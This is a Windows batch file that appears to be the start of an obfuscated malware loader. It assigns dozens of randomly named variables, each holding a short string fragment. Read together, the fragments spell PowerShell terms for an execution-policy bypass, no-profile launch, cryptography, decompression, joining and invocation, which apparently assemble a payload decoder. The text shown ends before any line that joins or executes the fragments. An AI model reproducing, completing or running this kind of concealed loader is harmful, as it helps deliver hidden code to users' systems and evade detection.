@echo off
set "LQnveUIsdL=mqfA"
set "fTyDQlKrpH=.Mod"
set "gjmHQPVHUO=ptog"
set "GTVVRpSUSb=iron"
set "ipNxqFafRI=S) {"
set "mydpyXTFTL=lit("
set "NlNfqVHlCv=tem."
set "mgZCpiqXIH= = N"
set "AvhgQJRlEk=bypa"
set "sCIpPDziiv=y.Cr"
set "KKvpPemtzo=-joi"
set "AkIWXmbMxQ=.Len"
set "nnsACSYYUB=);$L"
set "pBCmJzYUnv=k; }"
set "xSgDzlPVnR=ose("
set "blRGBRWsFF=Comp"
set "DGOxWDBUCW=ptor"
set "TZYmOhXvxU=Secu"
set "UOIVxMjzqa=wOYb"
set "bfQMpHKsJY=ke($"
set "qyLHgptkur=rtS4"
set "VuyweefoYv=MH ="
set "RgtvugpiYM=.Dis"
set "GnXuHcortN=gth)"
set "UFLYxxeaBS=]::N"
set "LPzKStVRRX=ss -"
set "MJvPNPbOKK=i.Pa"
set "hacHFQrRPs=yste"
set "vCLFjFgBGx=Conv"
set "OXIUmJPDfN=rofi"
set "sYjnmuYUos=tryP"
set "WNbMNzJZLd=ck($"
set "IbITolvrWh=ionM"
set "FdkguSdWrD=tqMH"
set "tDWjSgwxgK=ion."
set "XmBIikxjog=n ''"
set "aaBfQJqlMf=$Zpm"
set "PwMntGKhrJ=)))"
set "cgbdasDixi=ewLi"
set "PnhHRzYFWu=y]::"
set "bylUrpsLcR=pStr"
set "LbyhEQmhNk=();$"
set "gvXQXfdNmi=Stre"
set "YPWDaBImCm=kYyB"
set "VqrYXByPcy=Disp"
set "JSpxmjkfpq= = $"
set "TlajSjpcEI=$eTa"
